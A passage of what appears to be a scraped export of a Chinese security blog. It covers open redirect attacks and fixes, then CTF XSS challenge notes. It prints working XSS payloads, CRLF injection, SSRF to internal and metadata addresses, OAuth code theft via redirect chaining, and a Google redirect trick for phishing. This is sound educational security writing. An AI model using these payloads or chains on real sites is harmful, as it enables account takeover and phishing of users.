CVE-2022-07202022-03-01 發布 1.0.47 版，修復 CVE-2022-0720，部分資訊公開於 WPScan2022-03-02 透過 WPScan 回報更新預約狀態漏洞，保留 CVE-2022-08252022-03-03 透過 WPScan 回報 SMS 相關漏洞，保留 CVE-2022-08372022-03-09 發布 1.0.48 版，修復 CVE-2022-0837，部分資訊公開於 WPScan2022-03-14 發布 1.0.49 版，修復 CVE-2022-0825，部分資訊公開於 WPScan2022-03-26 漏洞細節公開於 WPScan2022-03-30 文章發佈","link":"/2022/03/30/wordpress-plugin-amelia-sensitive-information-disclosure/"},{"title":"在做跳轉功能時應該注意的問題：Open Redirect","text":"前言在許多網站中都有個很常見的功能，就是重新導向。 舉例來說，如果要觀看的頁面需要權限但是使用者還沒登入，就會先把使用者導去登入頁面，登入完之後再導回原本要去的頁面。 例如說今天有個社群網站，想要看個人檔案的話需要登入，而小明的個人檔案網址是：https://example.com/profile/ming，那我身為一個訪客，點進去之後就會跳轉到登入頁面，並且帶上我原本要去的網址當作參數：https://example.com/login?redirect=https://example.com/profile/ming 登入成功之後，網站就會根據 redirect 的值，把我導去原本要前往的頁面。 雖然看起來是個小功能，但其實背後有不少安全性的問題要考慮。 什麼是 open redirect？Open redirect，中文通常翻作開放式重定向或是公開重定向之類的，但我自己喜歡翻成：「任意重新導向」，覺得比較貼近原意，就是可以重新導向到任意目的地。 以文章開頭的例子來說，攻擊者其實可以在 URL 上面帶任何值，例如說：https://attacker.com，這樣使用者在登入之後，就會跳轉到這個頁面。 像這個就是需要使用者操作（登入）才能觸發重新導向，但有些功能無需使用者操作，可能就有著重新導向的功能。以登入的這個例子來說，假設使用者已經登入了，那 https://example.com/login?redirect=https://attacker.com 這個連結點下去之後，系統偵測到已經登入，就會直接把使用者轉到 https://attacker.com。 這造成的結果是什麼呢？ 使用者點了一個 example.com 的連結，卻在無意間被轉到 attacker.com 去。這種可以直接把使用者導到任意地方去的漏洞，就叫做 open redirect。 Open redirect 能造成什麼問題？一個最直覺能想到的攻擊方式，大概就是釣魚網站了。在講攻擊手法的時候，我覺得「情境」是一個滿重要的因素，有些看似沒什麼的攻擊，在搭配適當的情境之後，你會覺得「哇，好像滿容易成功的」。 在看得到網址的狀況下，你看到陌生的網址就會比較小心翼翼，因為你知道可能會是詐騙或是釣魚網站；但若是看到熟悉的網址，會放鬆一些戒心： 圖上的網址最後那段其實是 https://attacker.com url encode 過的結果，所以使用者根本不會注意到後面那串，只會看到前面是由 facebookb.com 開頭，這邊我想強調的事情是「看到熟悉的網址，使用者會比較沒有戒心」。 但這樣子的情境，其實很類似的網址也可以達成差不多的事情（只是效力比較低），例如說 facebo0k.com 或是 myfacebook.com 之類的。 這時候可以再設想另外一個情境，就是有些網站當你點擊外部連結的時候，會提醒你說：「你要連到外部網站了喔，要小心喔」，這時候如果利用 open redirect 的話，網站可能就不會跳出提示（因為是同一個網域），使用者或許就在無意之間跳到了別的網站而不自知。 例如說今天有個論壇好了，有個地方有 open redirect 的漏洞，然後我在文章裡面放了一個連結，利用 open redirect 讓跳去外部網站的提示失效，而使用者點了連結之後會到「精心設計的釣魚網站」，介面長得一模一樣，但是跳出個要輸入帳號密碼的 popup 跟你說你的連線階段已過期，請重新登入。這時使用者就有比較高的機率會去輸入帳號密碼，因為沒有想到自己被跳轉到釣魚網站。 以上這些問題，都只是在討論 open redirect 「不跟其他漏洞結合」的狀況下，可以造成哪些危害，聽起來好像還好對吧？跟其他攻擊比起來似乎沒什麼，但是 open redirect 被低估的地方，其實是在它與其他漏洞的結合之後，可以發揮出的威力。 在繼續往下之前，我們必須先了解一下重新導向的實作，主要分為兩種： 後端重新導向，透過 response header Location 前端重新導向，可能透過 history.push 或是 window.open 以及 location 等等 第一種透過後端來做 redirect，是靠 server 回傳 Location 這個 header，瀏覽器就會把使用者導到相對應的地方去。實作上可能會像是這樣： function handler(req, res) &#123; res.setStatus(302) res.setHeader('Location: ' + req.query.redirect) return &#125; 而第二種由前端實作的就不太一樣了，一個常見的範例是直接把要去的地方 assign 給 window.location 做頁面跳轉： const searchParams = new URLSearchParams(location.search) window.location = searchParams.get('redirect') 或如果是 SPA 不想換頁的話，可能會直接用 history.push 或是框架內建的 router.push。 而無論是前端還是後端來做重新導向，光是實作方式都有各自的問題需要處理。 後端：CRLF injection後端的重新導向中，會把傳過來的值塞到 Location 這個 response header 裡面。有些 server 或是 framework 如果沒有處理好的話，可以塞入換行字元，例如說把重新導向的網址設定為 abc\\ntest:123，有可能 response 就變成： HTTP&#x2F;2 302 Found Location: abc test:123 那若是改成：abc\\n\\n&lt;script&gt;alert(1)&lt;/script&gt;，response 就會變成： HTTP&#x2F;2 302 Found Location: abc &lt;script&gt;alert(1)&lt;&#x2F;script&gt; .... 藉由 CRLF injection 去改變 response body 的內容，但很遺憾似乎無法直接達成 XSS，因為瀏覽器看到 status code 是 301&#x2F;302 時會忽略 response body，直接把使用者導去目標頁面。 我找到可以運作的資料都已經是四五年前的了： [stagecafrstore.starbucks.com] CRLF Injection, XSS [dev.twitter.com] XSS and Open Redirect 我記得我好像看過有篇文章在講這種情況應該怎麼辦，但我找很久都找不到，如果知道該怎麼繞過的請告訴我。 不過就算改變 response body 沒什麼用，改變其他的 header 也可能串聯其他攻擊，例如說 Set-Cookie，可以幫使用者設置任意 cookie，就有機會再串接 session fixation 或是 CSRF 之類的攻擊。 前端：XSS如果是前端實作的重新導向，要特別注意的一個問題就是 XSS。 你可能會疑惑重新導向跟 XSS 有什麼關係，我們先來回顧一下前端重新導向的程式碼： const searchParams = new URLSearchParams(location.search) window.location = searchParams.get('redirect') 這樣會有什麼問題呢？ 在 JS 裡面有個應該不少人看過，但可能比較少用的東西，叫做 JavaScript pseudo protocol，像是這樣： &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;click me&lt;&#x2F;a&gt; 點了那個 a 之後，會執行 JS 跳出一個 alert。而這招除了可以用在 href 以外，其實也可以用在 location 上面： window.location = 'javascript:alert(1)' 打開你的瀏覽器開新分頁，然後在 devtool console 直接執行上面那一段，會發現 alert 真的跳出來了，而且以下幾種方式都會觸發： window.location.href = 'javascript:alert(1)' window.location.assign('javascript:alert(1)') window.location.replace('javascript:alert(1)') 因此攻擊者只要把 redirect 的位置設置成 javascript:xxx，就可以執行任意程式碼，觸發 XSS。這個案例前端的朋友們一定要特別注意，因為直接把值 assign 給 location 是個很常見的實作方式。 底下直接帶大家看一個真實世界的案例，對象是之前在另一篇文章：防止 XSS 可能比想像中困難出現過的網站：Matters News。 這是他們的登入頁面： 在點下登入之後，會呼叫一個叫做 redirectToTarget 的 function，而這個函式的程式碼是這樣： /** * Redirect to \"?target=\" or fallback URL with page reload. * * (works on CSR) */ export const redirectToTarget = (&#123; fallback = 'current', &#125;: &#123; fallback?: 'homepage' | 'current' &#125; = &#123;&#125;) => &#123; const fallbackTarget = fallback === 'homepage' ? `/` // FIXME: to purge cache : window.location.href const target = getTarget() || fallbackTarget window.location.href = decodeURIComponent(target) &#125; 在拿到 target 之後直接使用了：window.location.href = decodeURIComponent(target) 來做重新導向。而 getTarget 其實就是去 url query string 把 target 的值拿出來。所以如果登入的網址是：https://matters.news/login?target=javascript:alert(1)，在使用者按下登入並且成功之後，就會跳出一個 alert，觸發 XSS！ 不僅如此，這個 XSS 一旦被觸發了，影響力非同小可，因為這是登入頁面，所以在這個頁面上執行的 XSS，可以直接抓取 input 的值，也就是偷到使用者的帳號密碼。如果要執行實際的攻擊，可以針對網站的使用者寄發釣魚信，在信中放入這個惡意連結讓使用者點擊，由於網址是正常的網址，點擊之後到的頁面也是真的網站的頁面，因此可信程度應該滿高的。 在使用者輸入帳號密碼並且登入之後，用 XSS 把帳號密碼偷走並把使用者導回首頁，就可以不留痕跡地偷走使用者帳號，達成帳號奪取。 修復方式是只允許 http&#x2F;https 開頭的網址： const fallbackTarget = fallback === 'homepage' ? `/` // FIXME: to purge cache : window.location.href let target = decodeURIComponent(getTarget()) const isValidTarget = /^((http|https):\\/\\/)/.test(target) if (!isValidTarget) &#123; target = fallbackTarget &#125; window.location.href = target || fallbackTarget 不過這樣其實是先把重新導向功能的 XSS 修掉而已，open redirect 的部分依舊存在，需要進一步對 domain 做檢查才能排除 open redirect。 再次提醒，這個漏洞滿多工程師都不會發現，因為不知道 window.location.href 可以放 javascript:alert(1) 這樣的網址來執行程式碼，如果大家有實作到重新導向的功能，記得注意一下這個問題。 Open redirect 與其他漏洞的搭配從上面兩個問題可以看出光是「實作重新導向」就可能會寫出有漏洞的程式碼，而接下來要談的是「重新導向」這個功能與其他漏洞的結合。有至少兩個類型的漏洞都有機會與 open redirect 結合，一個是 SSRF，另一個是 OAuth 的漏洞。 SSRF，全名為 Server-Side Request Forgery，通常翻作伺服器請求偽造，關於這個漏洞詳細的介紹跟攻擊未來可能再寫一篇跟大家介紹，我這邊先簡單講一下。 通常在內部的 Server，都不會讓外部直接存取到，對外可能只會有一台 proxy 把 request forward 到對應的主機。假設有一個服務的伺服器架構如下圖所示，背後有一台 Back-end Server 會去呼叫隱藏在內網中的 PDF service 產生 PDF 檔案： 而這個 PDF service 限制網址只能是 https://example.com 開頭，避免有人傳入其他網址進來。這時如果某個 URL 有 open redirect 的漏洞，攻擊者就可以傳入：https://example.com?redirect=http://127.0.0.1，讓 PDF service 去造訪這個網址，而被轉址到 127.0.0.1，並且回傳它的內容。 這樣就叫做 SSRF，你透過內部的服務，成功發了一個 request 到外網進不去的 service，如此一來你就可以去看看內網還有什麼其他服務存在，例如說 Redis 或是 MySQL 等等，這些直接從外網都進不去，但透過 SSRF 就可以。或更簡單的方式是去看一些 cloud 相關的檔案，有些 cloud 服務只要存取 http://169.254.169.254 就會看到一些 metadata，有興趣可以看這邊：Abusing SSRF in AWS EC2 environment。 所以透過 open redirect，可以繞過原本有做網址檢查的地方。 第二個會碰到的問題則是跟 OAuth 有關，在 OAuth 的流程中通常都會有一個 redirect_uri，接收授權完畢之後的一個 code，以 Facebook 為例的話是長這樣： https:&#x2F;&#x2F;www.facebook.com&#x2F;v11.0&#x2F;dialog&#x2F;oauth? client_id&#x3D;&#123;app-id&#125; &amp;redirect_uri&#x3D;&#123;&quot;https:&#x2F;&#x2F;example.com&#x2F;login&quot;&#125; &amp;state&#x3D;&#123;&quot;&#123;st&#x3D;state123abc,ds&#x3D;123456789&#125;&quot;&#125; 使用者點擊網址後會跳到 Facebook，按下授權就會被導到 https://example.com/login 並且可以在網址中拿到 code 或是 token，接著就可以用這個搭配 client id 跟 client secret，拿到 auth token，並且用這個 auth token 代表使用者去跟 Facebook 拿取資料。 如果 redirect_uri 的保護沒有做好，攻擊者就可以把它換成其他值，例如說：redirect_uri=https://huli.tw，這樣使用者點擊授權以後，就會把驗證用的 code 傳到我的網站，而不是預期中的網站。 但一般來說 redirect_uri 都會限制 domain，所以沒那麼簡單就可以繞過。這時候就要請出 open redirect 登場了，如果網站有這個漏洞的話，就可以這樣：redirect_uri=https://example.com?redirect=https://huli.tw，如此一來就算符合 domain 限制，最後導向的地方依然是個外部網站，攻擊者一樣可以偷到驗證用的 code。 所以為了避免這類型的攻擊，Facebook 或 Google 這種大型服務在設置 App 的時候都會加強限制，redirect_uri 通常都會要求寫死，不讓你設置 wildcard，例如說我填 https://example.com/auth，就是真的只有這個網址可以過，其他不同 path 的網址都會失敗。但有些小公司沒有注意到這麼細，對於 redirect_uri 就沒有這麼多規範。 像是這種 OAuth 結合 open redirect 達成 account takeover（帳號奪取）的例子其實不少，例如說這個：[cs.money] Open Redirect Leads to Account Takeover，或是 GitHub 其實也有過這類型的漏洞：GitHub Gist - Account takeover via open redirect - $10,000 Bounty，而這個 Airbnb 的漏洞也很精彩：Authentication bypass on Airbnb via OAuth tokens theft。 總結一下，open redirect 的用處除了讓使用者放鬆戒心來進行釣魚以外，另一個就是繞過有針對 domain 進行檢查的地方。上面講的 SSRF 跟 OAuth 這兩個漏洞之所以能跟它結合，就是因為可以用 open redirect 來繞過對 domain 的檢查。 那該怎麼防禦 open redirect？如果想防止 open redirect，可想而知就是要對重新導向的網址進行檢查。這聽起來簡單，實作起來卻容易出現漏洞，例如說底下的例子是一段檢查 domain 的程式碼，根據取出的 hostname 比對是否含有 cymetrics.io，有的話就通過，目的是只有 cymetrics.io 跟它的 subdomain 可以通過： const validDomain = 'cymetrics.io' function validateDomain(url) &#123; const host = new URL(url).hostname // 取出 hostname return host.includes(validDomain) &#125; validateDomain('https://example.com') // false validateDomain('https://cymetrics.io') // true validateDomain('https://dev.cymetrics.io') // true 感覺好像沒什麼問題？除了 cymetrics.io 或是它的 subdomain 以外，應該不會有其他網域可以通過這檢查吧？ 雖然看似如此，但其實有兩個方式可以繞過。這邊先假設 URL parsing 的方式不會有問題，一定會拿到 hostname，所以 attacker.com?q=cymetrics.io 這種方式是沒用的，hostname 會拿到 attacker.com 而已。 大家可以想一下有哪兩種可以繞過，在公佈答案之前，先來看下一個段落。 Google 對於 open redirect 的看法Google 在官方網站 Bughunter University 當中有明確提到一般的 open redirect 不會被視為安全性上的漏洞，除非能證明它可以跟其他漏洞結合在一起使用。 那是不是有人成功過呢？當然，底下我舉兩個例子。 第一個例子來自這篇文章：Vulnerability in Hangouts Chat: from open redirect to code execution，對象是 Google Hangouts Chat 的 Electron App。 在那個 App 裡面如果網址是 https://chat.google.com 開頭的話，點擊網址就會直接在 Electron 裡面開啟網頁，而不是用瀏覽器去開。因此只要找到 https://chat.google.com 的 open redirect，就可以把使用者導去釣魚網站。而 Electron App 跟瀏覽器的差異之一就在於 Electron App 預設是不會有網址列的，所以使用者根本無從辨別這是不是釣魚網站。詳細的流程跟最後的 payload 可以參考原文，這個漏洞還可以進一步提升成 RCE（不過我不知道是怎麼做的就是了），價值 7500 USD。 第二個例子來自官方的文章：Open redirects that matter，這個案例也是超帥。 在 Google I&#x2F;O 2015 的網站中有個功能是去抓 Picasa 的資料回來並 render 成 JSON，但因為有跨網域的問題，因此後端寫了一個簡單的 proxy 去拿資料，像這樣：/api/v1/photoproxy?url=to，而這個 proxy 會檢查 url 的開頭是否為 https://picasaweb.google.com/data/feed/api，如果不是的話就回傳錯誤。 所以作者的第一個目標就是找到 picasa 上的 open redirect，他最後找到的是這個網址：https://picasaweb.google.com/bye?continue=，只要把這個網址改成：https://picasaweb.google.com/data/feed/api/../../bye，就可以成功通過路徑的檢查，讓 server 認為這是一個合法的 URL。 但這還沒結束，因為 bye?continue&#x3D; 這個 redirect 也會檢查參數，continue 必須是 https://google.com 開頭才可以。因此我們需要找到第二個 open redirect，這次是存在於 google.com 上面。而 google.com 有一個知名的 open redirect 是 AMP 用的，例如說 https://www.google.com/amp/tech-blog.cymetrics.io，就會連到 https://tech-blog.cymetrics.io （不過我剛嘗試了一下會先跳到中間頁，點擊確認後才會導向，應該是這功能有修正過了）。 結合這兩個 open redirect，就可以讓 proxy 去抓取我們指定的 url 的內容： https:&#x2F;&#x2F;picasaweb.google.com&#x2F;data&#x2F;feed&#x2F;api&#x2F;..&#x2F;..&#x2F;..&#x2F;bye&#x2F;? continue&#x3D;https%3A%2F%2Fwww.google.com%2Famp&#x2F; your-domain.example.com&#x2F;path?querystring 可是抓了之後只會輸出成 JSON，有什麼用呢？後端的程式碼如下： func servePhotosProxy(w http.ResponseWriter, r *http.Request) &#123; c := newContext(r) if r.Method != \"GET\" &#123; writeJSONError(c, w, http.StatusBadRequest, \"invalid request method\") return &#125; url := r.FormValue(\"url\") if !strings.HasPrefix(url, \"https://picasaweb.google.com/data/feed/api\") &#123; writeJSONError(c, w, http.StatusBadRequest, \"url parameter is missing or is an invalid endpoint\") return &#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; writeJSONError(c, w, errStatus(err), err) return &#125; res, err := httpClient(c).Do(req) if err != nil &#123; writeJSONError(c, w, errStatus(err), err) return &#125; defer res.Body.Close() w.Header().Set(\"Content-Type\", \"application/json;charset=utf-8\") w.WriteHeader(res.StatusCode) io.Copy(w, res.Body) &#125; 因為有設置 content type，所以沒辦法用 MIME sniffing 去攻擊。簡單解釋一下 MIME sniffing，當你的 response 沒有設置 content type 的時候，瀏覽器就會自動去猜這是什麼內容，如果裡面含有 HTML 的話，那就會被當成是 HTML 網站來解析並且渲染。 而作者發現了另一個 bug，就是如果是 error 的話，並不會設置 content type，只有成功的時候會，所以可以故意回傳一個含有 HTML 的錯誤訊息，這樣被印在畫面時瀏覽器就會把這整份當成是 HTML，進而達成 XSS！詳細的流程跟介紹原文都寫得很清楚，很推薦大家去看一下原文。 以上就是兩個在 Google 中曾經被發現的 open redirect 串聯其他漏洞引起的攻擊，兩個都很有趣！ 看完上面這些之後，我突然很好奇有哪些 Google 的 open redirect 是大家都知道的，於是我就 google 了：known google open redirect，找到底下幾個網站： How scammers abuse Google Search’s open redirect feature Google - Open Redirect Google Bug that Makes Your Bank More Vulnerable to Phishing 如果只是一般的 https://www.google.com/url?q=http://tech-blog.cymetrics.io 的話，點進去只會跳到確認頁面，但如果後面加一個參數 usg 的話，就可以不經過確認直接重新導向，不信你點點看這個，會去 example.org：https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA 那這個 usg 是什麼呢？應該是網址經過某種 hash 過後的結果，但你不會知道怎麼算出來的。而要獲得這個 usg 其實也不難，你用 gmail 寄信給自己，信裡面要有你想導向的連結，接著再用 HTML basic view 來看，就會看到信中的連結變成了上面格式的重新導向！ 像是這個，就是我們部落格的重新導向連結：https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug 實測之後發現真的能不經過確認就跳轉，這個功能好像已經存在滿久了，未來如果有需要 google.com 的 open redirect 可以參考看看。 檢查 redirect 的 domain好，接著講回剛剛問大家的兩種繞過方式，我再貼一次檢查 domain 的程式碼，讓大家回憶一下，接著就直接公布答案： const validDomain = 'cymetrics.io' function validateDomain(url) &#123; const host = new URL(url).hostname // 取出 hostname return host.includes(validDomain) &#125; validateDomain('https://example.com') // false validateDomain('https://cymetrics.io') // true validateDomain('https://dev.cymetrics.io') // true 這是在檢查 domain 時滿常會犯的錯誤，因為沒有考慮到以下兩種情形： cymetrics.io.huli.tw fakecymetrics.io 上面這兩種情形都符合條件，但卻不是我們想要的結果。 其實不只是檢查 domain，在做任何檢查的時候用 includes 或是 contains 直接去看整體是否包含某個字串都是一件比較危險的事情。最好的方式其實是設一個 allow list 並且要完全一致才通過，這樣是最嚴格的。但如果想要允許所有 subdomain 的話，可以這樣檢查： const validDomain = 'cymetrics.io' function validateDomain(url) &#123; const host = new URL(url).hostname // 取出 hostname return host === validDomain || host.endsWith('.' + validDomain) &#125; subdomain 的部分結尾要是 .cymetrics.io，所以一定會是 cymetrics.io 的 subdomain，而主要的 domain 也要完全符合才可以。不過這樣寫的話，如果某一個不相干的 subdomain 有 open redirect 的漏洞，這段就破功了。因此還是建議大家只把確定會 redirect 的 domain 放進去並且直接用 === 做檢查，避免這種狀況發生。 結語重新導向是個很常見的功能，最常見的就是登入前點了某個連結之後轉到登入頁面，登入成功就會自動跳轉回去。在做這個功能時，如果是前端重新導向，再次提醒大家，要考慮到 window.location = &#39;javascript:alert(1)&#39; 這樣會出事，請確認重新導向的 URL 是合法的 URL 再做動作。另外，也要確認檢查 domain 時有考慮到可能會被繞過的狀況，盡可能用最嚴謹的方式去處理。 以上就是對 open redirect 的介紹，希望對大家有幫助，有什麼疑問或是寫錯的地方都可以在下面留言跟我討論。 參考資料： The real impact of an Open Redirect vulnerability Intigriti: Open Redirect Misconfigured OAuth leading to Account Takeover Open Redirect Vulnerability GitHub Gist - Account takeover via open redirect - $10,000 Bounty OAuth to Account takeover","link":"/2021/09/26/what-is-open-redirect/"},{"title":"一堆來不及做的 web 與 XSS 題目","text":"因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。 這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。 關鍵字列表： copy paste XSS connection pool content type UTF16 multipart&#x2F;mixed Chrome DevTools Protocol new headless mode default download Scroll to Text Fragment (STTF) webVTT cue xsleak flask&#x2F;werkzeug cookie parsing quirks DOM-based race condition來源：https://twitter.com/ryotkak/status/1710291366654181749 題目很簡單，就給你一個可編輯的 div 加上 Angular，允許任何的 user interaction，要做到 XSS。 &lt;div contenteditable>&lt;/div> &lt;script src=\"https://angular-no-http3.ryotak.net/angular.min.js\">&lt;/script> 當初看到題目的時候有猜到應該跟 copy paste 有關，解答中有提到說在 &lt;div contenteditable&gt;&lt;/div&gt; 貼上內容時，是可以貼上 HTML 的。雖然瀏覽器後來有做 sanitizer，但並不會針對自訂的屬性。 也就是說，如果搭配其他 gadget 的話，還是有機會做到 XSS。 例如說作者的文章中提到的這個 pattern，因為有 AngularJS 的關係所以會執行程式碼： &lt;html ng-app> &lt;script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js\">&lt;/script> &lt;div ng-init=\"constructor.constructor('alert(1)')()\">&lt;/div> &lt;/html> 但問題是使用者在貼入 payload 的時候，AngularJS 已經載入完畢了。載入完成的時候如果 payload 還不存在，那就不會被執行，所以需要延長 AngularJS 載入的時間。 最後作者是用 connection pool 來解決這問題的，就是把 pool 塞爆，就可以延長 script 的載入時間，在載入完成以前貼好 payload。 作者 writeup：https://blog.ryotak.net/post/dom-based-race-condition/ 罕見的 Content-type 與 UTF16來源：https://twitter.com/avlidienbrunn/status/1703805922043220273 題目如下： &lt;?php /* FROM php:7.0-apache RUN a2dismod status COPY ./files/index.php /var/www/html COPY ./files/harder.php /var/www/html EXPOSE 80 */ $message = isset($_GET['message']) ? $_GET['message'] : 'hello, world'; $type = isset($_GET['type']) ? $_GET['type'] : die(highlight_file(__FILE__)); header(\"Content-Type: text/$type\"); header(\"X-Frame-Options: DENY\"); if($type == \"plain\")&#123; die(\"the message is: $message\"); &#125; ?> &lt;html> &lt;h1>The message is:&lt;/h1> &lt;hr/> &lt;pre> &lt;input type=\"text\" value=\"&lt;?php echo preg_replace('/([^\\s\\w!-~]|\")/','',$message);?>\"> &lt;/pre> &lt;br> solved by: &lt;li> nobody yet!&lt;/li> &lt;/html> 可以控制部分內容以及部分 content type，該怎麼做到 XSS？ 第一招是讓 content type 為 text/html; charset=UTF-16LE，就可以讓瀏覽器把頁面解讀為 UTF16，控制輸出內容。 這招讓我想到了 UIUCTF 2022 中的 modernism 那題。 第二招是先運用 content type header 的特性，當 response header 是 Content-Type: text/x,image/gif 時，因為 text/x 是非法的 content type，所以瀏覽器會優先看合法的 image/gif。 也就是說，儘管 content type 的前半段是寫死的，依然可以利用這個技巧覆蓋掉完整的 content type。而有一個古老的 content type 叫做 multipart/mixed，像是 response 版的 multipart&#x2F;form，可以輸出像這樣的 response： HTTP&#x2F;1.1 200 OK Content-type: multipart&#x2F;mixed;boundary&#x3D;&quot;8ormorebytes&quot; ignored_first_part_before_boundary --8ormorebytes Content-Type: text&#x2F;html &lt;img src&#x3D;x onerror&#x3D;alert(domain)&gt; --8ormorebytes ignored_last_part 瀏覽器會挑自己看得懂的部分去 render，而 Firefox 有支援這個 content type。 話說這個 content type 還可以拿來繞過 CSP，可以參考這個連結：https://twitter.com/ankursundara/status/1723410507389129092 Intigriti October 2023 challenge題目：https://challenge-1023.intigriti.io/ 在後端有個注入點： &lt;title>Intigriti XSS Challenge - &lt;%- title %>&lt;/title> 這個 title 來自於： const getTitle = (path) => &#123; path = decodeURIComponent(path).split(\"/\"); path = path.slice(-1).toString(); return DOMPurify.sanitize(path); &#125; 雖然說是 DOMPurify，看似不可繞過，但其實用 &lt;div id=&quot;&lt;/title&gt;&lt;h1&gt;hello&lt;/h1&gt;&quot;&gt; 可以閉合前面的 &lt;title&gt;，就可以注入任意 tag。 但這題的 input 是來自於 path，所以要把一些 / 弄掉，這邊最後是利用 innerHTML 會把屬性 decode 的特性，用 &amp;sol; 來取代 /，最後湊出這樣的 payload： &#x2F;&lt;p id&#x3D;&quot;&lt;%26sol%3Btitle&gt;&lt;script&gt;alert()&lt;%26sol%3Bscript&gt;&quot;&gt; 這題的目標是要讀本地檔案，所以 XSS 是不夠的，下一步要想辦法從 XSS 繼續往下延伸。 這題的 flag 有 --disable-web-security，SOP 被關掉了，可以讀到其他來源的 response，而 CDP 有 origin 的限制沒辦法完全使用，但有部分功能可以，例如說開啟一個新網頁之類的。 但因為檔案在本地，所以只有 file:/// 開頭的檔案可以讀到其他本地檔案，因此目標就變成要想辦法在本地弄出一個檔案。 解法是在新的 headless mode 中，下載功能是預設開啟的，所以只要觸發下載以後，就會把檔案存到固定規則的位置，用 CDP 打開以後即可。 作者 writeup：https://mizu.re/post/intigriti-october-2023-xss-challenge DOM clobbering來源：https://twitter.com/kevin_mizu/status/1697625861543923906 題目是一個自製的 sanitizer： class Sanitizer &#123; // https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360 DEFAULT_TAGS = [ /* ... */ ]; constructor(config=&#123;&#125;) &#123; this.version = \"2.0.0\"; this.creator = \"@kevin_mizu\"; this.ALLOWED_TAGS = config.ALLOWED_TAGS ? config.ALLOWED_TAGS.concat([ \"html\", \"head\", \"body\" ]).filter(tag => this.DEFAULT_TAGS.includes(tag)) : this.DEFAULT_TAGS; this.ALLOWED_ATTS = config.ALLOWED_ATTS ? config.ALLOWED_ATTS.filter(attr => this.DEFAULT_ATTRS.includes(attr)) : this.DEFAULT_ATTRS; &#125; // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924 _isClobbered = function (elm) &#123; return ( elm instanceof HTMLFormElement &amp;&amp; (typeof elm.nodeName !== 'string' || typeof elm.textContent !== 'string' || typeof elm.removeChild !== 'function' || !(elm.attributes instanceof NamedNodeMap) || typeof elm.removeAttribute !== 'function' || typeof elm.setAttribute !== 'function' || typeof elm.namespaceURI !== 'string' || typeof elm.insertBefore !== 'function' || typeof elm.hasChildNodes !== 'function') ) &#125; // https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028 removeNode = (currentNode) => &#123; const parentNode = currentNode.parentNode; const childNodes = currentNode.childNodes; if (childNodes &amp;&amp; parentNode) &#123; const childCount = childNodes.length; for (let i = childCount - 1; i >= 0; --i) &#123; parentNode.insertBefore( childNodes[i].cloneNode(), currentNode.nextSibling ); &#125; &#125; currentNode.parentElement.removeChild(currentNode); &#125; sanitize = (input) => &#123; let currentNode; var dom_tree = new DOMParser().parseFromString(input, \"text/html\"); var nodeIterator = document.createNodeIterator(dom_tree); while ((currentNode = nodeIterator.nextNode())) &#123; // avoid DOMClobbering if (this._isClobbered(currentNode) || typeof currentNode.nodeType !== \"number\") &#123; this.removeNode(currentNode); continue; &#125; switch(currentNode.nodeType) &#123; case currentNode.ELEMENT_NODE: var tag_name = currentNode.nodeName.toLowerCase(); var attributes = currentNode.attributes; // avoid mXSS if (currentNode.namespaceURI !== \"http://www.w3.org/1999/xhtml\") &#123; this.removeNode(currentNode); continue; // sanitize tags &#125; else if (!this.ALLOWED_TAGS.includes(tag_name))&#123; this.removeNode(currentNode); continue; &#125; // sanitize attributes for (let i=0; i &lt; attributes.length; i++) &#123; if (!this.ALLOWED_ATTS.includes(attributes[i].name))&#123; this.removeNode(currentNode); continue; &#125; &#125; &#125; &#125; return dom_tree.body.innerHTML; &#125; &#125; 內容有參考許多其他的 sanitizer library，像是 DOMPurify 等等。 這題的關鍵是以往對於 form 的 DOM clobber，都是像這樣： &lt;form id=\"test\"> &lt;input name=x> &lt;/form> 理所當然地把元素放在 form 裡面，就可以污染 test.x。 但其實還有一招是使用 form 屬性，就可以把元素放在外面： &lt;input form=test name=x> &lt;form id=\"test\">&lt;/form> 這一題的 sanitizer 在移除元素時，是這樣做的： removeNode = (currentNode) => &#123; const parentNode = currentNode.parentNode; const childNodes = currentNode.childNodes; if (childNodes &amp;&amp; parentNode) &#123; const childCount = childNodes.length; for (let i = childCount - 1; i >= 0; --i) &#123; parentNode.insertBefore( childNodes[i].cloneNode(), currentNode.nextSibling ); &#125; &#125; currentNode.parentElement.removeChild(currentNode); &#125; 把要刪除的元素底下的 node，都插入到 parent 的 nextSibling 去。 因此，如果 clobber 了 nextSibling，製造出這樣的結構： &lt;input form=test name=nextSibling> &lt;form id=test> &lt;input name=nodeName> &lt;img src=x onerror=alert(1)> &lt;/form> 就會在移除 &lt;form&gt; 時，把底下的節點都插入到 &lt;input form=test name=nextSibling&gt; 後面，藉此繞過 sanitizer。 真有趣的題目！雖然知道有 form 這個屬性，但還沒想過可以拿來搭配 DOM clobbering。 作者的 writeup：https://twitter.com/kevin_mizu/status/1701922141791211776 LakeCTF 2023 GeoGuessy來源是參考這篇 writeup：XSS, Race Condition, XS-Leaks and CSP &amp; iframe’s sandbox bypass - LakeCTF 2023 GeoGuessy 先來看兩個有趣的 unintended，第一個是利用 cookie 不看 port 的特性，用其他題目的 XSS 來拿到 cookie，不同題目之間如果沒有隔離好就會這樣，例如說 SekaiCTF 2023 - leakless note 也是。 第二個是寫 code 的 bad practice 造成的 race condition。 在訪問頁面時會去設定 user，這邊的 user 是 global variable： router.get('/', async (req, res) => &#123; user = await db.getUserBy(\"token\", req.cookies?.token) if (user) &#123; isPremium = user.isPremium username = user.username return res.render('home',&#123;username, isPremium&#125;); &#125; else &#123; res.render('index'); &#125; &#125;); 然後 update user 時也是用類似的模式，拿到 user 